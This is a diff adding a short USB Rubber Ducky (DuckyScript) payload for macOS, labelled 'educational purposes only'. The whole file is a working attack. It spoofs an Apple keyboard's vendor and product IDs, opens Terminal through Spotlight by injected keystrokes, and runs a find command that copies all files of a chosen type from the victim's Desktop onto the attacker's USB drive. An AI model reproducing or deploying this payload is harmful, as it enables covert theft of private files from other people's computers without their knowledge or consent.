@@ -1,0 +1,14 @@
+REM Copy any file type from Desktop to USB (MAC)
+REM Author: Sean Chow
+REM Educational purposes only :)
+
+ATTACKMODE HID STORAGE VID_05AC PID_021E
+DELAY 1000
+COMMAND SPACE
+DELAY 50
+STRING terminal
+ENTER
+DELAY 500
+REM Replace txt with any file extension (ex. .pdf, .py, .doc, .html, .xlsx, .csv, .png, .jpeg, etc) 
+STRING find ~/Desktop -name "*.txt" -exec cp {} /Volumes/DUCKY \;
+ENTER
